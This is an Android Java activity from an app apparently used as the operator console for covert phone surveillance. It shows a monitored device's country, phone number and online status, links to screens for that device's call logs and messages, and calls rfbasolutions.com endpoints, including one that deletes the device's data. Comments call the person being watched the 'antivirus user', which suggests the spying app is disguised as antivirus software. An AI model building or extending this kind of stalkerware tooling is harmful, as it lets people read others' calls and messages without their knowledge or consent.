package com.example.muhammadashfaq.recieveapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.example.muhammadashfaq.recieveapp.Adapter.CartAdapter;
import com.example.muhammadashfaq.recieveapp.Broadcast.ConnectivityReciever;
import com.example.muhammadashfaq.recieveapp.Model.IMEINModel;
import com.example.muhammadashfaq.recieveapp.Service.ConnectionService;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class HomeActivity extends AppCompatActivity implements ConnectivityReciever.ConnectivityRecieverListner {

    LinearLayout linearLayoutNetworkStatus,linearLayoutPhone,linearLayoutCountry;
    TextView txtVuHeadingNetwork, txtVuCountry,txtVuPhone;
    RecyclerView recyclerViewIMEI;
    String phoneNumber,device_name,device_online_status;
    Button btnCalllogs,btnMessages;

    ProgressDialog progressDialog;

    DatabaseReference dbRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        Toolbar toolbar=findViewById(R.id.toolbar_home);
        setSupportActionBar(toolbar);
        getSupportActionBar().setTitle("Home");
        toolbar.setBackgroundColor(getResources().getColor(R.color.colorPrimary));

        intializations();
        String DEVICE_NAME = android.os.Build.MODEL;

        progressDialog=new ProgressDialog(this);
        progressDialog.setTitle("Refreshing");
        progressDialog.setMessage("Please wait for a litte while");
        progressDialog.setCancelable(true);


        if(getIntent()!=null){
            device_name = getIntent().getStringExtra("device_name");
            device_name=device_name.toUpperCase();
            startThreadOnline();

            dbRef= FirebaseDatabase.getInstance().getReference("Mobile").child(device_name);

        }

        //Getting country of antivirus user
        getCountry();

        //Getting mobile numbner of antivirus user
        setMobileNumber();


//        //Getting weather antivirus user is online or offline
//        getMobileData();


    }

    private void setMobileNumber() {
        DatabaseReference dbRefDevicePhone = FirebaseDatabase.getInstance().getReference("Devices");
        if(dbRefDevicePhone!=null){
            dbRefDevicePhone.child(device_name).addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                        if(dataSnapshot!=null){
                            if(dataSnapshot.child("phonenumber").exists()){
                                String devicePhone=dataSnapshot.child("phonenumber").getValue().toString();
                                linearLayoutPhone.setVisibility(View.VISIBLE);
                                txtVuPhone.setText(devicePhone);
                            }

                        }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });
        }
    }

    private void getMobileData() {


        if(dbRef!=null){
            dbRef.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                    if(dataSnapshot!=null){
                        if(dataSnapshot.child("online").exists()){
                            progressDialog.dismiss();
                            String online = dataSnapshot.child("online").getValue().toString();
                            if(online.equals("true")){
                                progressDialog.dismiss();
                                linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                                linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorGreen));
                                txtVuHeadingNetwork.setText("ONLINE");
                            }else{
                                progressDialog.dismiss();
                                linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                                linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorRed));
                                txtVuHeadingNetwork.setText("OFFLINE");
                            }
                        }
                    }
                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });
        }

    }


    private void getCountry() {
        Log.i("country",device_name);
        DatabaseReference dbRefCountry=FirebaseDatabase.getInstance().getReference("Countries");
        dbRefCountry.child(device_name).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if(dataSnapshot!=null){
                    if(dataSnapshot.hasChild("country")){
                        String country = dataSnapshot.child("country").getValue().toString();
                        linearLayoutCountry.setVisibility(View.VISIBLE);
                        txtVuCountry.setText(country);
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }

    private void intializations() {
        linearLayoutNetworkStatus=findViewById(R.id.linearNetworkStatus);
        txtVuHeadingNetwork=findViewById(R.id.tv_heading);
        txtVuCountry=findViewById(R.id.tv_country);
        recyclerViewIMEI=findViewById(R.id.recyler_view);
        linearLayoutPhone=findViewById(R.id.linearPhone);
        txtVuPhone=findViewById(R.id.tv_phone);
        linearLayoutCountry=findViewById(R.id.linearCountry);
        btnCalllogs=findViewById(R.id.calllogs);
        btnMessages=findViewById(R.id.btn_messages);
    }

    public void getCalllogs(View view) {
        Intent mIntent=new Intent(this,Calllogs.class);
        mIntent.putExtra("device_name",device_name);
        startActivity(mIntent);
    }

    public void getMessages(View view) {
        Intent mIntent=new Intent(this,Messages.class);
        mIntent.putExtra("device_name",device_name);
        startActivity(mIntent);

    }


    @Override
    protected void onResume() {
        super.onResume();
        MyApplication.getInstance().setConnectivtyListner(this);
        boolean isConnected=ConnectivityReciever.isConnected();
        checkConnection(isConnected);

    }


//    private ArrayList startThread() {
//        Thread mThread= new Thread(){
//            public void run(){
//                super.run();
//                try {
//                    Thread.sleep(1000);
//                    trimCache(HomeActivity.this);
//                    StringRequest mStringRequest = new StringRequest(1, "http://rfbasolutions.com/get_messages_api/get_last_messages.php", new Response.Listener<String>() {
//                        @Override
//                        public void onResponse(String response) {
////                            spinKitView.setVisibility(View.GONE);
////                            data=response;
////                            list.add(response);
////                            //Toast.makeText(getApplicationContext(), list.toString(), Toast.LENGTH_SHORT).show();
////                            cartAdapter= new CartAdapter(list,R.layout.recyler_item,HomeActivity.this);
////                            recyclerView.setLayoutManager(new LinearLayoutManager(HomeActivity.this));
////                            recyclerView.setAdapter(cartAdapter);
//
//                            /*intent.putExtra("Messages",response);
//                            startService(intent);*/ //start service which is MyService.java
//                        }
//                    }, new Response.ErrorListener() {
//                        @Override
//                        public void onErrorResponse(VolleyError error) {
////                            spinKitView.setVisibility(View.GONE);
////                            Toast.makeText(Messages.this, error.toString(), Toast.LENGTH_SHORT).show();
//                        }
//                    }){
//                        @Override
//                        protected Map<String, String> getParams() throws AuthFailureError {
//
//
//                            return null;
//
//                        }
//                    };
//
//                    RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
//                    mRequestQueue.add( mStringRequest);
//                }catch (InterruptedException e){
//                    e.printStackTrace();
//                }
//            }
//        };
//        mThread.start();
//
//        return list;
//
//    }

    private void deleteMobile() {
        Thread mThread= new Thread(){
            public void run(){
                super.run();
                try {
                    Thread.sleep(1000);
                    trimCache(HomeActivity.this);
                    StringRequest mStringRequest = new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/delete_mobile_data.php", new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {

                            if(response.equals("true")){
                                Toast.makeText(HomeActivity.this, "Mobile Deleleted Successfully", Toast.LENGTH_SHORT).show();
                                Intent intent=new Intent(HomeActivity.this,IMEIActivity.class);
                                startActivity(intent);
                                finish();

                            }
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {

                            Toast.makeText(HomeActivity.this, error.toString(), Toast.LENGTH_SHORT).show();
                        }
                    }){
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {

                            HashMap<String,String> params=new HashMap<>();

                            Log.i("device",device_name);
                            params.put("device_name",device_name);

                            return params;

                        }
                    };

                    RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
                    mRequestQueue.add( mStringRequest);
                }catch (InterruptedException e){
                    e.printStackTrace();
                }
            }
        };
        mThread.start();

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {

        getMenuInflater().inflate(R.menu.home_menu,menu);
        return true;
    }


    @Override
    public boolean onOptionsItemSelected(MenuItem item) {


        int id=item.getItemId();
        if(id==R.id.refresh_message_home){
            progressDialog.show();
            startThreadOnline();
        }
        return true;
    }


    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {

        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

// The directory is now empty so delete it
        return dir.delete();
    }

    private void checkConnection(boolean isConnected) {
        if(isConnected){

        }else{

        }
    }


    @Override
    public void onNetworkConnectionChanged(boolean isConnected) {
            checkConnection(isConnected);
    }

    public void onClickDelteMobile(View view) {

            btnCalllogs.setVisibility(View.GONE);
            btnMessages.setVisibility(View.GONE);
            deleteMobile();
    }



    private void startThreadOnline() {
        trimCache(HomeActivity.this);
        StringRequest mStringRequest = new StringRequest(1, "http://rfbasolutions.com/get_messages_api/get_online_status.php", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("Response",response);

               // Toast.makeText(HomeActivity.this, response, Toast.LENGTH_SHORT).show();
                if(response.equals("online")){
                    progressDialog.dismiss();
                    linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                    linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorGreen));
                    txtVuHeadingNetwork.setText("ONLINE");
                }else {
                    progressDialog.dismiss();
                    linearLayoutNetworkStatus.setVisibility(View.VISIBLE);
                    linearLayoutNetworkStatus.setBackgroundColor(getResources().getColor(R.color.colorRed));
                    txtVuHeadingNetwork.setText("OFFLINE");
                }


            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                Log.i("Error",error.toString());
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {


                HashMap<String,String> params=new HashMap<>();

                if(device_name!=null){
                    Log.i("device",device_name);
                    params.put("device_name",device_name);




                }


                params.put("ping","somthing");

                return params;

            }
        };

        RequestQueue mRequestQueue = Volley.newRequestQueue(HomeActivity.this);
        mRequestQueue.add( mStringRequest);

    }

}
